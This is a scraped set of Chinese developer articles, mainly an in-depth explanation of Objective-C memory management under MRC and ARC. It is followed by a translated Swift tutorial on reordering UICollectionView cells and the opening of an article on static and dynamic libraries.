<p>在ARC中与内存管理有关的变量标识符，有下面几种：</p>
<ul>
<li><p><code>__strong</code></p></li>
<li><p><code>__weak</code></p></li>
<li><p><code>__unsafe_unretained</code></p></li>
<li><p><code>__autoreleasing</code></p></li>
</ul>
<p><code>__strong</code> 是默认使用的标识符。只有还有一个强指针指向某个对象，这个对象就会一直存活。</p>
<p><code>__weak</code> 声明这个引用不会保持被引用对象的存活，如果对象没有强引用了，弱引用会被置为 nil</p>
<p><code>__unsafe_unretained</code> 声明这个引用不会保持被引用对象的存活，如果对象没有强引用了，它不会被置为 nil。如果它引用的对象被回收掉了，该指针就变成了野指针。</p>
<p><code>__autoreleasing</code> 用于标示使用引用传值的参数（id *），在函数返回时会被自动释放掉。</p>
<p>变量标识符的用法如下：</p>
<pre><code class=""objectivec"">Number* __strong num = [[Number alloc] init];</code></pre>
<p>注意 <code>__strong</code> 的位置应该放到 <code>*</code> 和变量名中间，放到其他的位置严格意义上说是不正确的，只不过编译器不会报错。</p>
<h4>属性标识符</h4>
<p>类中的属性也可以加上标志符：</p>
<pre><code class=""objectivec"">@property (assign/retain/strong/weak/unsafe_unretained/copy) Number* num</code></pre>
<p><code>assign </code>表明 setter 仅仅是一个简单的赋值操作，通常用于基本的数值类型，例如<code>CGFloat</code>和<code>NSInteger</code>。</p>
<p><code>strong</code> 表明属性定义一个拥有者关系。当给属性设定一个新值的时候，首先这个值进行 <code>retain</code> ，旧值进行 <code>release</code> ，然后进行赋值操作。</p>
<p><code>weak</code> 表明属性定义了一个非拥有者关系。当给属性设定一个新值的时候，这个值不会进行 <code>retain</code>，旧值也不会进行 <code>release</code>， 而是进行类似 <code>assign</code> 的操作。不过当属性指向的对象被销毁时，该属性会被置为nil。</p>
<p><code>unsafe_unretained</code> 的语义和 <code>assign</code> 类似，不过是用于对象类型的，表示一个非拥有(unretained)的，同时也不会在对象被销毁时置为nil的(unsafe)关系。</p>
<p><code>copy</code> 类似于 <code>strong</code>，不过在赋值时进行 <code>copy</code> 操作而不是 <code>retain</code> 操作。通常在需要保留某个不可变对象（NSString最常见），并且防止它被意外改变时使用。</p>
<h5>错误使用属性标识符的后果</h5>
<p>如果我们给一个原始类型设置 <code>strong\weak\copy</code> ，编译器会直接报错：</p>
<blockquote><p>Property with 'retain (or strong)' attribute must be of object type</p></blockquote>
<p>设置为 <code>unsafe_unretained</code> 倒是可以通过编译，只是用起来跟 <code>assign</code> 也没有什么区别。</p>
<p>反过来，我们给一个 NSObject 属性设置为 assign，编译器会报警：</p>
<blockquote><p>Assigning retained object to unsafe property; object will be released after assignment</p></blockquote>
<p>正如警告所说的，对象在赋值之后被立即释放，对应的属性也就成了野指针，运行时跑到属性有关操作会直接崩溃掉。和设置成 <code>unsafe_unretained</code> 是一样的效果（设置成 <code>weak</code> 不会崩溃）。</p>
<h5>
<code>unsafe_unretained</code> 的用处</h5>
<p><code>unsafe_unretained</code> 差不多是实际使用最少的一个标识符了，在使用中它的用处主要有下面几点：</p>
<ol>
<li><p>兼容性考虑。iOS4 以及之前还没有引入 <code>weak</code>，这种情况想表达弱引用的语义只能使用 <code>unsafe_unretained</code>。这种情况现在已经很少见了。</p></li>
<li><p>性能考虑。使用 <code>weak</code> 对性能有一些影响，因此对性能要求高的地方可以考虑使用 <code>unsafe_unretained</code> 替换 <code>weak</code>。一个例子是 <a href=""https://github.com/ibireme/YYModel/blob/master/YYModel/NSObject%2BYYModel.m"" rel=""nofollow noreferrer"">YYModel 的实现</a>，为了追求更高的性能，其中大量使用 <code>unsafe_unretained</code> 作为变量标识符。</p></li>
</ol>
<h3>引用循环</h3>
<p>当两个对象互相持有对方的强引用，并且这两个对象的引用计数都不是0的时候，便造成了引用循环。</p>
<p>要想破除引用循环，可以从以下几点入手：</p>
<ul>
<li><p>注意变量作用域，使用 <code>autorelease</code> 让编译器来处理引用</p></li>
<li><p>使用弱引用(weak)</p></li>
<li><p>当实例变量完成工作后，将其置为nil</p></li>
</ul>
<h3>Autorelease Pool</h3>
<p>Autorelase Pool 提供了一种可以允许你向一个对象延迟发送<code>release</code>消息的机制。当你想放弃一个对象的所有权，同时又不希望这个对象立即被释放掉（例如在一个方法中返回一个对象时），Autorelease Pool 的作用就显现出来了。</p>
<p>所谓的延迟发送<code>release</code>消息指的是，当我们把一个对象标记为<code>autorelease</code>时:</p>
<pre><code class=""objectivec"">NSString* str = [[[NSString alloc] initWithString:@""hello""] autorelease];</code></pre>
<p>这个对象的 retainCount 会+1，但是并不会发生 release。当这段语句所处的 autoreleasepool 进行 drain 操作时，所有标记了 <code>autorelease</code> 的对象的 retainCount 会被 -1。即 <code>release</code> 消息的发送被延迟到 pool 释放的时候了。</p>
<p>在 ARC 环境下，苹果引入了 <code>@autoreleasepool</code> 语法，不再需要手动调用 <code>autorelease</code> 和 <code>drain</code> 等方法。</p>
<h4>Autorelease Pool 的用处</h4>
<p>在 ARC 下，我们并不需要手动调用 autorelease 有关的方法，甚至可以完全不知道 autorelease 的存在，就可以正确管理好内存。因为 Cocoa Touch 的 Runloop 中，每个 runloop circle 中系统都自动加入了 Autorelease Pool 的创建和释放。</p>
<p>当我们需要创建和销毁大量的对象时，使用手动创建的 autoreleasepool 可以有效的避免内存峰值的出现。因为如果不手动创建的话，外层系统创建的 pool 会在整个 runloop circle 结束之后才进行 drain，手动创建的话，会在 block 结束之后就进行 drain 操作。详情请参考<a href=""https://developer.apple.com/library/ios/documentation/Cocoa/Conceptual/MemoryMgmt/Articles/mmAutoreleasePools.html#//apple_ref/doc/uid/20000047-CJBFBEDI"" rel=""nofollow noreferrer"">苹果官方文档</a>。一个普遍被使用的例子如下：</p>
<pre><code class=""objectivec"">for (int i = 0; i &lt; 100000000; i++)
{
    @autoreleasepool
    {
        NSString* string = @""ab c"";
        NSArray* array = [string componentsSeparatedByString:string];
    }
}</code></pre>
<p>如果不使用 autoreleasepool ，需要在循环结束之后释放 100000000 个字符串，如果<br>使用的话，则会在每次循环结束的时候都进行 release 操作。</p>
<h4>Autorelease Pool 进行 Drain 的时机</h4>
<p>如上面所说，系统在 runloop 中创建的 autoreleaspool 会在 runloop 一个 event 结束时进行释放操作。我们手动创建的 autoreleasepool 会在 block 执行完成之后进行 drain 操作。需要注意的是：</p>
<ul>
<li><p>当 block 以异常（exception）结束时，pool 不会被 drain</p></li>
<li><p>Pool 的 drain 操作会把所有标记为 autorelease 的对象的引用计数减一，但是并不意味着这个对象一定会被释放掉，我们可以在 autorelease pool 中手动 retain 对象，以延长它的生命周期（在 MRC 中）。</p></li>
</ul>
<h4>main.m 中 Autorelease Pool 的解释</h4>
<p>大家都知道在 iOS 程序的 main.m 文件中有类似这样的语句：</p>
<pre><code class=""objectivec"">int main(int argc, char * argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}</code></pre>
<p>在面试中问到有关 autorelease pool 有关的知识也多半会问一下，这里的 pool 有什么作用，能不能去掉之类。在这里我们分析一下。</p>
<p>根据<a href=""https://developer.apple.com/library/ios/documentation/UIKit/Reference/UIKitFunctionReference/index.html#//apple_ref/c/func/UIApplicationMain"" rel=""nofollow noreferrer"">苹果官方文档</a>， UIApplicationMain 函数是整个 app 的入口，用来创建 application 对象（单例）和 application delegate。尽管这个函数有返回值，但是实际上却永远不会返回，当按下 Home 键时，app 只是被切换到了后台状态。</p>
<p>同时参考苹果关于 Lifecycle 的<a href=""https://developer.apple.com/library/ios/documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/TheAppLifeCycle/TheAppLifeCycle.html"" rel=""nofollow noreferrer"">官方文档</a>，UIApplication 自己会创建一个 main run loop，我们大致可以得到下面的结论：</p>
<ol>
<li><p>main.m 中的 UIApplicationMain 永远不会返回，只有在系统 kill 掉整个 app 时，系统会把应用占用的内存全部释放出来。</p></li>
<li><p>因为(1)， UIApplicationMain 永远不会返回，这里的 autorelease pool 也就永远不会进入到释放那个阶段</p></li>
<li><p>在 (2) 的基础上，假设有些变量真的进入了 main.m 里面这个 pool（没有被更内层的 pool 捕获），那么这些变量实际上就是被泄露的。这个 autorelease pool 等于是把这种泄露情况给隐藏起来了。</p></li>
<li><p>UIApplication 自己会创建 main run loop，在 Cocoa 的 runloop 中实际上也是自动包含 autorelease pool 的，因此 main.m 当中的 pool 可以认为是<strong>没有</strong>必要的。</p></li>
</ol>
<p>在基于 AppKit 框架的 Mac OS 开发中， main.m 当中就是不存在 autorelease pool 的，也进一步验证了我们得到的结论。不过因为我们看不到更底层的代码，加上苹果的文档中不建议修改 main.m ，所以我们也没有理由就直接把它删掉（亲测，删掉之后不影响 App 运行，用 Instruments 也看不到泄露）。</p>
<h4>Autorelease Pool 与函数返回值</h4>
<p>如果一个函数的返回值是指向一个对象的指针，那么这个对象肯定不能在函数返回之前进行 release，这样调用者在调用这个函数时得到的就是野指针了，在函数返回之后也不能立刻就 release，因为我们不知道调用者是不是 retain 了这个对象，如果我们直接 release 了，可能导致后面在使用这个对象时它已经成为 nil 了。</p>
<p>为了解决这个纠结的问题， Objective-C 中对对象指针的返回值进行了区分，一种叫做 <em>retained return value</em>，另一种叫做 <em>unretained return value</em>。前者表示调用者拥有这个返回值，后者表示调用者不拥有这个返回值，按照“谁拥有谁释放”的原则，对于前者调用者是要负责释放的，对于后者就不需要了。</p>
<p>按照苹果的命名 convention，以 <code>alloc</code>, <code>copy</code>, <code>init</code>, <code>mutableCopy</code> 和 <code>new</code> 这些方法打头的方法，返回的都是 retained return value，例如 <code>[[NSString alloc] initWithFormat:]</code>，而其他的则是 unretained return value，例如 <code>[NSString stringWithFormat:]</code>。我们在编写代码时也应该遵守这个 convention。</p>
<p>我们分别在 MRC 和 ARC 情况下，分析一下两种返回值类型的区别。</p>
<h5>MRC</h5>
<p>在 MRC 中我们需要关注这两种函数返回类型的区别，否则可能会导致内存泄露。</p>
<p><em>对于 retained return value，需要负责释放</em></p>
<p>假设我们有一个 property 定义如下：</p>
<pre><code class=""objectivec"">@property (nonatomic, retain) NSObject *property;</code></pre>
<p>在对其赋值的时候，我们应该使用：</p>
<pre><code class=""objectivec"">self.property = [[[NSObject alloc] init] autorelease];</code></pre>
<p>然后在 dealloc 方法中加入：</p>
<pre><code class=""objectivec"">[_property release];
_property = nil;</code></pre>
<p>这样内存的情况大体是这样的：</p>
<ol>
<li><p>init 把 retain count 增加到 1</p></li>
<li><p>赋值给 self.property ，把 retain count 增加到 2</p></li>
<li><p>当 runloop circle 结束时，autorelease pool 执行 drain，把 retain count 减为 1</p></li>
<li><p>当整个对象执行 dealloc 时， release 把 retain count 减为 0，对象被释放</p></li>
</ol>
<p>可以看到没有内存泄露发生。</p>
<p>如果我们只是使用：</p>
<pre><code class=""objectivec"">self.property = [[NSObject alloc] init];</code></pre>
<p>这一条语句会导致 retain count 增加到 2，而我们少执行了一次 release，就会导致 retain count 不能被减为 0 。</p>
<p>另外，我们也可以使用临时变量：</p>
<pre><code class=""objectivec"">NSObject * a = [[NSObject alloc] init];
self.property = a;
[a release];</code></pre>
<p>这种情况，因为对 a 执行了一次 release，所有不会出现上面那种 retain count 不能减为 0 的情况。</p>
<p><strong>注意</strong>：现在大家基本都是 ARC 写的比较多，会忽略这一点，但是根据上面的内容，我们看到在 MRC 中直接对 self.proprety 赋值和先赋给临时变量，再赋值给 self.property，确实是有区别的！我在面试中就被问到这一点了。</p>
<p>我们在编写自己的代码时，也应该遵守上面的原则，同样是使用 autorelease：</p>
<pre><code class=""objectivec"">// 注意函数名的区别
+ (MyCustomClass *) myCustomClass
{
    return [[[MyCustomClass alloc] init] autorelease]; // 需要 autorelease
}
- (MyCustomClass *) initWithName:(NSString *) name
{
    return [[MyCustomClass alloc] init]; // 不需要 autorelease
}</code></pre>
<p><em>对于 unretained return value，不需要负责释放</em></p>
<p>当我们调用非 alloc，init 系的方法来初始化对象时（通常是工厂方法），我们不需要负责变量的释放，可以当成普通的临时变量来使用：</p>
<pre><code class=""objectivec"">NSString *name = [NSString stringWithFormat:@""%@ %@"", firstName, lastName];
self.name = name
// 不需要执行 [name release]</code></pre>
<h5>ARC</h5>
<p>在 ARC 中我们完全不需要考虑这两种返回值类型的区别，ARC 会自动加入必要的代码，因此我们可以放心大胆地写：</p>
<pre><code class=""objectivec"">self.property = [[NSObject alloc] init];
self.name = [NSString stringWithFormat:@""%@ %@"", firstName, lastName];</code></pre>
<p>以及在自己写的函数中：</p>
<pre><code class=""objectivec"">+ (MyCustomClass *) myCustomClass
{
    return [[MyCustomClass alloc] init]; // 不用 autorelease
}</code></pre>
<p>这些写法都是 OK 的，也不会出现内存问题。</p>
<p>为了进一步理解 ARC 是如何做到这一点的，我们可以参考 Clang 的<a href=""http://clang.llvm.org/docs/AutomaticReferenceCounting.html#unretained-return-values"" rel=""nofollow noreferrer"">文档</a>。</p>
<p>对于 retained return value， Clang 是这样做的：</p>
<blockquote>
<p>When returning from such a function or method, ARC retains the value at the point of evaluation of the return statement, before leaving all local scopes.</p>
<p>When receiving a return result from such a function or method, ARC releases the value at the end of the full-expression it is contained within, subject to the usual optimizations for local values.</p>
</blockquote>
<p>可以看到基本上 ARC 就是帮我们在代码块结束的时候进行了 release：</p>
<pre><code class=""objectivec"">NSObject * a = [[NSObject alloc] init];
self.property = a;
//[a release]; 我们不需要写这一句，因为 ARC 会帮我们把这一句加上</code></pre>
<p>对于 unretained return value：</p>
<blockquote>
<p>When returning from such a function or method, ARC retains the value at the point of evaluation of the return statement, then leaves all local scopes, and then balances out the retain while ensuring that the value lives across the call boundary. In the worst case, this may involve an autorelease, but callers must not assume that the value is actually in the autorelease pool.</p>
<p>ARC performs no extra mandatory work on the caller side, although it may elect to do something to shorten the lifetime of the returned value.</p>
</blockquote>
<p>这个和我们之前在 MRC 中做的不是完全一样。ARC 会把对象的生命周期延长，确保调用者能拿到并且使用这个返回值，但是并不一定会使用 autorelease，文档写的是在 worst case 的情况下才可能会使用，因此调用者不能假设返回值真的就在 autorelease pool 中。从性能的角度，这种做法也是可以理解的。如果我们能够知道一个对象的生命周期最长应该有多长，也就没有必要使用 autorelease 了，直接使用 release 就可以。如果很多对象都使用 autorelease 的话，也会导致整个 pool 在 drain 的时候性能下降。</p>
<h5>weak 与 autorelease</h5>
<p>众所周知，weak 不会持有对象，当给一个 weak 赋以一个自己生成的对象（即上面提到的 retained return value）后，对象会立马被释放。</p>
<p>一个很常见的 warning 就是 Assigning retained object to weak variable, object will be released after assignment.</p>
<p>但是我们前面也提到了，可以持有非自己生成的对象，这通过 autorelease 实现。</p>
<p>那么如果一个 weak 被赋以一个非自己生成的对象（即上面提到的 unretained return value）呢？代码如下：</p>
<pre><code class=""objectivec"">NSNumber __weak *number = [NSNumber numberWithInt:100];
NSLog(@""number = %@"", number);</code></pre>
<p>这种情况下是可以正确打印值的。</p>
<p><a href=""http://clang.llvm.org/docs/AutomaticReferenceCounting.html#arc-runtime-objc-loadweak"" rel=""nofollow noreferrer"">clang的文档</a> 是这么说的：这种情况下，weak 并不会立即释放，而是会通过 <code>objc_loadWeak</code> 这个方法注册到 AutoreleasePool 中，以延长生命周期。</p>
<h5>ARC 下是否还有必要在 dealloc 中把属性置为 nil？</h5>
<p>为了解决这个问题，首先让我们理清楚属性是个什么存在。属性(property) 实际上就是一种语法糖，每个属性背后都有实例变量(Ivar)做支持，编译器会帮我们自动生成有关的 setter 和 getter，对于下面的 property：</p>
<pre><code class=""objectivec"">@interface Counter : NSObject
@property (nonatomic, retain) NSNumber *count;
@end;</code></pre>
<p>生成的 getter 和 setter 类似下面这样：</p>
<pre><code class=""objectivec"">- (NSNumber *)count {
    return _count;
}
- (void)setCount:(NSNumber *)newCount {
    [newCount retain];
    [_count release];
    // Make the new assignment.
    _count = newCount;
}</code></pre>
<p>Property 这部分对于 MRC 和 ARC 都是适用的。</p>
<p>有了这部分基础，我们再来理解一下把属性置为 nil 这个步骤。首先要明确一点，在 MRC 下，我们并不是真的把属性置为 nil，而是把 Ivar 置为 nil。</p>
<pre><code class=""objectivec"">[_property release];
_property = nil;</code></pre>
<p>如果用 self.property 的话还会调用 setter，里面可能存在某些不应该在 dealloc 时运行的代码。</p>
<p>对于 ARC 来说，系统会自动在 dealloc 的时候把所有的 Ivar 都执行 release，因此我们也就没有必要在 dealloc 中写有关 release 的代码了。</p>
<h5>在 ARC 下把变量置为 nil 有什么效果？什么情况下需要把变量置为 nil？</h5>
<p>在上面有关 property 的内容基础上，我们知道用:</p>
<pre><code class=""objectivec"">self.property = nil</code></pre>
<p>实际上就是手动执行了一次 release。而对于临时变量来说：</p>
<pre><code class=""objectivec"">NSObject *object = [[NSObject alloc] init];
object = nil;</code></pre>
<p>置为 nil 这一句其实没什么用（除了让 object 在下面的代码里不能再使用之外），因为上面我们讨论过 ，ARC 下的临时变量是受到 Autorelease Pool 的管理的，会自动释放。</p>
<p>因为 ARC 下我们不能再使用 release 函数，把变量置为 nil 就成为了一种释放变量的方法。真正需要我们把变量置为 nil 的，通常就是在使用 block 时，用于破除循环引用：</p>
<pre><code class=""objectivec"">MyViewController * __block myController = [[MyViewController alloc] init…];
// ...
myController.completionHandler =  ^(NSInteger result) {
    [myController dismissViewControllerAnimated:YES completion:nil];
    myController = nil;
};</code></pre>
<p>在 <a href=""https://github.com/yuantiku/YTKNetwork"" rel=""nofollow noreferrer"">YTKNetwork</a> 这个项目中，也可以看到类似的代码：</p>
<pre><code class=""objectivec"">- (void)clearCompletionBlock {
    // nil out to break the retain cycle.
    self.successCompletionBlock = nil;
    self.failureCompletionBlock = nil;
}</code></pre>
<h5>ARC 在运行时期的优化</h5>
<p>上面提到对于 unretained return value， ARC “并不一定会使用 autorelease”，下面具体解释一下。</p>
<p>ARC 所做的事情并不仅仅局限于在编译期找到合适的位置帮你插入合适的 <code>release</code> 等等这样的内存管理方法，其在运行时期也做了一些优化，如下是两个优化的例子：</p>
<ol>
<li><p>合并对称的引用计数操作。比如将 +1/-1/+1/-1 直接置为 0.</p></li>
<li><p>巧妙地跳过某些情况下 <code>autorelease</code> 机制的调用。</p></li>
</ol>
<p>其中第二个优化，是 ARC 针对 <code>autorelease</code> 返回值提供的一套优化策略，大体的流程如下：</p>
<p>当方法全部基于 ARC 实现时，在方法 return 的时候，ARC 会调用 <code>objc_autoreleaseReturnValue()</code> 以替代 MRC 下的 <code>autorelease</code>。在 MRC 下需要 retain 的位置，ARC 会调用 <code>objc_retainAutoreleasedReturnValue()</code>。因此下面的 ARC 代码：</p>
<pre><code class=""objectivec"">+ (instancetype)createSark {
    return [self new];
}
// caller
Sark *sark = [Sark createSark];</code></pre>
<p>实际上会被改写成类似这样：</p>
<pre><code class=""objectivec"">+ (instancetype)createSark {
    id tmp = [self new];
    return objc_autoreleaseReturnValue(tmp); // 代替我们调用autorelease
}
// caller
id tmp = objc_retainAutoreleasedReturnValue([Sark createSark]) // 代替我们调用retain
Sark *sark = tmp;
objc_storeStrong(&amp;sark, nil); // 相当于代替我们调用了release</code></pre>
<p>有了这个基础，ARC 可以使用一些优化技术。在调用 <code>objc_autoreleaseReturnValue()</code> 时，会在栈上查询 return address 以确定 return value 是否会被直接传给 <code>objc_retainAutoreleasedReturnValue()</code>。 如果没传，说明返回值不能直接从提供方发送给接收方，这时就会调用 <code>autorelease</code>。反之，如果返回值能顺利的从提供方传送给接收方，那么就会直接跳过 <code>autorelease</code> 过程，并且修改 return address 以跳过 <code>objc_retainAutoreleasedReturnValue()</code>过程，这样就跳过了整个 <code>autorelease</code> 和 <code>retain</code>的过程。</p>
<blockquote><p><strong>核心思想</strong>：当返回值被返回之后，紧接着就需要被 retain 的时候，没有必要进行 autorelease + retain，直接什么都不要做就好了。</p></blockquote>
<p>另外，当函数的调用方是非 ARC 环境时，ARC 还会进行更多的判断，在这里不再详述，详见 <a href=""http://blog.sunnyxx.com/2014/10/15/behind-autorelease/"" rel=""nofollow noreferrer"">《黑幕背后的 Autorelease》</a>。</p>
<h3>关于如何写一个检测循环引用的工具</h3>
<p>Instrument 为我们提供了 Allocations/Leaks 这样好用的工具用来检测 memory leak 的工具。如下是内存泄露的两种类型：</p>
<ul>
<li><p>Leaked memory: Memory unreferenced by your application that cannot be used again or freed (also detectable by using the Leaks instrument).</p></li>
<li><p>Abandoned memory: Memory still referenced by your application that has no useful purpose.</p></li>
</ul>
<p>其中 Leaks 工具主要用来检测 Leaked memory，在 MRC 时代 程序员会经常忘记写 release 方法导致内存泄露，在 ARC 时代这种已经不太常见。(ARC时代 主要的Leaked Memory 来自于底层 C 语言以及 一些由 C 写成的底层库，往往会因为忘记手工 free 而导致 leak )。</p>
<p>Allocations 工具主要用来检测 Abandoned memory. 主要思路是在一个时间切片内检测对象的声明周期以观察内存是否会无限增长。通过 hook 掉 alloc，dealloc，retain，release 等方法，来记录对象的生命周期。</p>
<h3>参考资料</h3>
<ul>
<li><p><a href=""http://blog.csdn.net/fightingbull/article/details/8098133"" rel=""nofollow noreferrer"">Objective-C内存管理MRC与ARC</a></p></li>
<li><p><a href=""http://www.oschina.net/news/42288/10-objective-c-interview"" rel=""nofollow noreferrer"">10个Objective-C基础面试题，iOS面试必备</a></p></li>
<li><p><a href=""http://blog.sunnyxx.com/2014/10/15/behind-autorelease/"" rel=""nofollow noreferrer"">黑幕背后的 Autorelease</a></p></li>
<li><p><a href=""http://blog.leichunfeng.com/blog/2015/05/31/objective-c-autorelease-pool-implementation-principle/"" rel=""nofollow noreferrer"">Objective-C Autorelease Pool 的实现原理</a></p></li>
<li><p><a href=""http://www.galloway.me.uk/2012/02/how-does-objc_retainautoreleasedreturnvalue-work/"" rel=""nofollow noreferrer"">How does objc_retainAutoreleasedReturnValue work?</a></p></li>
<li><p>https://stackoverflow.com/questions/9784762/strong-weak-retain-unsafe-unretained-assign</p></li>
<li><p>https://stackoverflow.com/questions/29350634/ios-autoreleasepool-in-main-and-arc-alloc-release</p></li>
<li><p>https://stackoverflow.com/questions/6588211/why-do-the-ios-main-m-templates-include-a-return-statement-and-an-autorelease-po</p></li>
<li><p>https://stackoverflow.com/questions/2702548/if-the-uiapplicationmain-never-returns-then-when-does-the-autorelease-pool-get</p></li>
<li><p>https://stackoverflow.com/questions/6055274/use-autorelease-when-setting-a-retain-property-using-dot-syntax</p></li>
<li><p>https://stackoverflow.com/questions/17601274/arc-and-autorelease</p></li>
<li><p>https://stackoverflow.com/questions/8292060/arc-equivalent-of-autorelease</p></li>
<li><p>https://stackoverflow.com/questions/7906804/do-i-set-properties-to-nil-in-dealloc-when-using-arc</p></li>
<li><p>http://wereadteam.github.io/2016/02/22/MLeaksFinder/?from=singlemessage&amp;isappinstalled=0</p></li>
<li><p>http://clang.llvm.org/docs/AutomaticReferenceCounting.html#arc-runtime-objc-loadweak</p></li>
</ul>

                ", Objective-C 内存管理——你需要知道的一切,1531972042,158,1,734,1,1,https://segmentfault.com/a/1190000004943276
110,1,0,6,"
                    
<blockquote>
<p>本文原链：<a href=""http://chengkang.me/2016/04/12/%E3%80%90%E8%AF%91%E3%80%91UICollectionView%20%E8%BD%BB%E6%9D%BE%E9%87%8D%E6%8E%92/"" rel=""nofollow noreferrer"">【译】UICollectionView 轻松重排</a><br>原文链接：<a href=""http://nshint.io/blog/2015/07/16/uicollectionviews-now-have-easy-reordering/"" rel=""nofollow noreferrer"">UICollectionViews Now Have Easy Reordering</a></p>
<p>原本打算总结一下 UICollectionView 的一些用法，看到一篇比较好的文章，所以直接翻译了。翻译得比较生硬，见谅。</p>
</blockquote>
<p>我超喜欢<code>UICollectionView</code>。相比<code>UITableView</code>，它容易自定义得多。现在我使用甚至使用 collection view 比使用 table view 还要频繁了。在 iOS9 中，它开始支持使用起来很简单的重排。在之前是不可能直接重排的，而且实现起来很麻烦。让我们一起来看看 API。你可以在 <a href=""https://github.com/nshintio/uicollectionview-reordering"" rel=""nofollow noreferrer"">Github</a> 上找到对应的 Xcode 项目。</p>
<p>最简单的实现重排是通过使用<code>UICollectionViewController</code>。它现在有一个新的属性叫做<code>installsStandardGestureForInteractiveMovement</code>，作用是添加手势（gestures）来重排 cells。这个属性默认值为<code>True</code>，这意味着要使用它我们只需要重写一个方法。</p>
<pre><code>func collectionView(collectionView: UICollectionView,
    moveItemAtIndexPath sourceIndexPath: NSIndexPath,
    toIndexPath destinationIndexPath: NSIndexPath) {
    // move your data order
    // 可以留空
}</code></pre>
<p>当前的 collection view 判定 items 可以被移动，因为<code>moveItemAtIndexPath</code>被重写了。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006768313"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>当我们希望在一个简单的<code>UIViewController</code>中使用 collection view 时，会麻烦一点。我们也要实现之前提到的<code>UICollectionViewDataSource</code>方法，不过我们需要重写<code>installsStandardGestureForInteractiveMovement</code>。不用担心，也很简单。<code>UILongPressGestureRecognizer</code>是一种持续性的手势识别器并且完全支持拖动。</p>
<pre><code>override func viewDidLoad() {
    super.viewDidLoad()

            longPressGesture = UILongPressGestureRecognizer(target: self, action: ""handleLongGesture:"")
        self.collectionView.addGestureRecognizer(longPressGesture)
}

    func handleLongGesture(gesture: UILongPressGestureRecognizer) {

        switch(gesture.state) {

        case UIGestureRecognizerState.Began:
            guard let selectedIndexPath = self.collectionView.indexPathForItemAtPoint(gesture.locationInView(self.collectionView)) else {
                break
            }
            collectionView.beginInteractiveMovementForItemAtIndexPath(selectedIndexPath)
        case UIGestureRecognizerState.Changed:
            collectionView.updateInteractiveMovementTargetPosition(gesture.locationInView(gesture.view!))
        case UIGestureRecognizerState.Ended:
            collectionView.endInteractiveMovement()
        default:
            collectionView.cancelInteractiveMovement()
        }
    }</code></pre>
<p>我们保存了在 long press gesture 中不活的被选中的 index path 并且基于它是否有值决定允不允许拖动手势生效。然后，我们根据手势状态调用一些新的 collection view 方法。</p>
<ul>
<li><p><code>beginInteractiveMovementForItemAtIndexPath(indexPath: NSIndexPath)</code>：开始指定位置 cell 的交互移动。</p></li>
<li><p><code>updateInteractiveMovementTargetPosition(targetPosition: CGPoint)</code>：更新交互移动对象的位置</p></li>
<li><p><code>endInteractiveMovement()</code>：在你结束拖动手势之后结束交互移动</p></li>
<li><p><code>cancelInteractiveMovement()</code>：取消交互移动</p></li>
</ul>
<p>这些让搞定拖动手势非常容易。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004928012"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>效果和标准的<code>UICollectionViewController</code>一样。很酷对吧，不过更酷的是我们可以将我们自定义的 collection view layout 应用到重排中去。看看下面在简单的瀑布视图中的交互移动。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004928014"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>嗯，看起来不错，不过如果我们不想在移动的时候改变 cell 大小呢？选中的 cell 大小应该在交互移动时保持一致。这是可以实现的。<code>UICollectionViewLayout</code>也有一些其他的方法来负责重排。</p>
<pre><code>func invalidationContextForInteractivelyMovingItems(targetIndexPaths: [NSIndexPath],
    withTargetPosition targetPosition: CGPoint,
    previousIndexPaths: [NSIndexPath],
    previousPosition: CGPoint) -&gt; UICollectionViewLayoutInvalidationContext

func invalidationContextForEndingInteractiveMovementOfItemsToFinalIndexPaths(indexPaths: [NSIndexPath],
    previousIndexPaths: [NSIndexPath],
    movementCancelled: Bool) -&gt; UICollectionViewLayoutInvalidationContext</code></pre>
<p>前一个在目标 indexPath 和之前的 indexPath 之间进行移动时调用。另一个类似，不过是在移动结束之后调用。有了这些我们就可以通过一些小手段达到我们的要求。</p>
<pre><code>internal override func invalidationContextForInteractivelyMovingItems(targetIndexPaths: [NSIndexPath],
    withTargetPosition targetPosition: CGPoint,
    previousIndexPaths: [NSIndexPath],
    previousPosition: CGPoint) -&gt; UICollectionViewLayoutInvalidationContext {

    var context = super.invalidationContextForInteractivelyMovingItems(targetIndexPaths,
        withTargetPosition: targetPosition, previousIndexPaths: previousIndexPaths,
        previousPosition: previousPosition)

    self.delegate?.collectionView!(self.collectionView!, moveItemAtIndexPath: previousIndexPaths[0],
        toIndexPath: targetIndexPaths[0])

    return context
}</code></pre>
<p>解决方案非常清晰。获取正在移动的 cell 之前和目标 index path。然后调用<code>UICollectionViewDataSource</code>来移动这些 item。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004928011"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>不用怀疑，collection view 重排是一个非常棒的更新。UIKit 工程师干得太棒了！：）</p>

                ", 【译】UICollectionView 轻松重排,1531972044,481,1,257,1,1,https://segmentfault.com/a/1190000004927408
111,1,0,6,"
                    
<h2>静态库与动态库的区别</h2>
<p>首先来看什么是库，库(Library)说白了就是一段编译好的二进制代码，加上头文件就可以供别人使用。</p>
<p>什么时候我们会用到库呢？一种情况是某些代码需要给别人使用，但是我们不希望别人看到源码，就需要以库的形式进行封装，只暴露出头文件。另外一种情况是，对于某些不会进行大的改动的代码，我们想减少编译的时间，就可以把它打包成库，因为库是已经编译好的二进制了，编译的时候只需要 Link 一下，不会浪费编译时间。</p>
<p>上面提到库在使用的时候需要 Link，Link 的方式有两种，静态和动态，于是便产生了静态库和动态库。</p>
<h3>静态库</h3>
<p>静态库即静态链接库（Windows 下的 .lib，Linux 和 Mac 下的 .a）。之所以叫做静态，是因为静态库在编译的时候会被直接拷贝一份，复制到目标程序里，这段代码在目标程序里就不会再改变了。</p>
<p>静态库的好处很明显，编译完成之后，库文件实际上就没有作用了。目标程序没有外部依赖，直接就可以运行。当然其缺点也很明显，就是会使用目标程序的体积增大。</p>
